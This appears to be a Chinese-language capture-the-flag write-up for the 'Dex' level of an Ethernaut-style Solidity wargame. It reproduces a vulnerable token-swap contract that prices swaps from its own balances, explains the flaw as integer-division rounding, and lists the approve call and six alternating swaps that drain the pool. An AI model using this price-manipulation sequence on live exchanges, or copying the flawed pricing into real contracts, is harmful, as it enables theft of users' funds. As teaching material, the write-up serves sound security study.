### 第二十二题 Dex
### 题目
此题目的目标是让您破解下面的基本合约并通过价格操纵窃取资金。一开始您可以得到10个token1和token2。合约以每个代币100个开始。如果您设法从合约中取出两个代币中的至少一个，并让合约得到一个的“坏”的token价格，您将在此级别上取得成功。
### 提示
- 通常，当您使用ERC20代币进行交换时，您必须approve合约才能为您使用代币。为了与题目的语法保持一致，我们刚刚向合约本身添加了approve方法。因此，请随意使用 contract.approve(contract.address, <uint amount>) 而不是直接调用代币，它会自动批准将两个代币花费所需的金额。 请忽略SwappableToken合约。
- 代币的价格是如何计算的？
- approve方法如何工作？
- 您如何批准ERC20 的交易？
### 源码
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "openzeppelin-contracts-08/token/ERC20/IERC20.sol";
import "openzeppelin-contracts-08/token/ERC20/ERC20.sol";
import "openzeppelin-contracts-08/access/Ownable.sol";

contract Dex is Ownable {
// 定义Dex合约，继承Ownable合约
    address public token1;
    // 声明token1地址变量
    address public token2;
    // 声明token2地址变量

    constructor() {}

    function setTokens(address _token1, address _token2) public onlyOwner {
    // 设置token地址，仅所有者可调用
        token1 = _token1;
        token2 = _token2;
    }

    function addLiquidity(address token_address, uint256 amount) public onlyOwner {
    // 添加流动性，仅所有者可调用
        IERC20(token_address).transferFrom(msg.sender, address(this), amount);
        // 从消息发送者转移指定数量的token到合约地址
    }

    function swap(address from, address to, uint256 amount) public {
    // 交换token
        require((from == token1 && to == token2) || (from == token2 && to == token1), "Invalid tokens");
        // 确保交换的token是预先设置的token
        require(IERC20(from).balanceOf(msg.sender) >= amount, "Not enough to swap");
        // 确保消息发送者有足够的token进行交换
        uint256 swapAmount = getSwapPrice(from, to, amount);
        // 获取交换价格
        IERC20(from).transferFrom(msg.sender, address(this), amount);
        // 从消息发送者转移指定数量的from token到合约地址
        IERC20(to).approve(address(this), swapAmount);
        // 批准合约转移swapAmount数量的to token
        IERC20(to).transferFrom(address(this), msg.sender, swapAmount);
        // 从合约地址转移swapAmount数量的to token到消息发送者
    }

    function getSwapPrice(address from, address to, uint256 amount) public view returns (uint256) {
    // 获取交换价格
        return ((amount * IERC20(to).balanceOf(address(this))) / IERC20(from).balanceOf(address(this)));
        // 计算交换价格
    }

    function approve(address spender, uint256 amount) public {
    // 批准spender转移指定数量的token
        SwappableToken(token1).approve(msg.sender, spender, amount);
        // 批准spender转移token1
        SwappableToken(token2).approve(msg.sender, spender, amount);
        // 批准spender转移token2
    }

    function balanceOf(address token, address account) public view returns (uint256) {
    // 获取账户的token余额
        return IERC20(token).balanceOf(account);
        // 返回账户余额
    }
}

contract SwappableToken is ERC20 {
// 定义SwappableToken合约，继承ERC20合约
    address private _dex;
    // 声明_dex地址变量

    constructor(address dexInstance, string memory name, string memory symbol, uint256 initialSupply)
        ERC20(name, symbol)
    {
        _mint(msg.sender, initialSupply);
        // 铸造初始供应量的token给消息发送者
        _dex = dexInstance;
        // 设置_dex地址
    }

    function approve(address owner, address spender, uint256 amount) public {
    // 批准spender转移指定数量的token
        require(owner != _dex, "InvalidApprover");
        // 确保owner不是_dex地址
        super._approve(owner, spender, amount);
        // 调用父类的approve函数
    }
}
```

### 解题思路&过程
1. 在计算每次交换的代币数量时，get_swap_price函数内部使用了除法，而在接收这个结果的这一句，swap_amount定义为uint256类型，由于除法可能产生小数，小数转整型不可避免地存在精度缺失问题，导致了在交换过程中我们可以获取更多代币，从而达到清空题目合约拥有代币数的目的。
2. 授权
``await contract.approve(player,1000)``  
``await contract.approve(contract.address,1000)``  
3. 循环转账  
``token1 = (await contract.token1())``  
``token2 = (await contract.token2())``  
``//第一次交换``  
``await contract.swap(token1,token2,10)``  
``//第二次交换  
await contract.swap(token2,token1,20)  
//第三次交换  
await contract.swap(token1,token2,24)  
//第四次交换  
await contract.swap(token2,token1,30)  
//第五次交换  
await contract.swap(token1,token2,41)  
//第六次交换，注意这里是45就正好，多了会超过最大值报错  
await contract.swap(token2,token1,45)``  
4. 提交
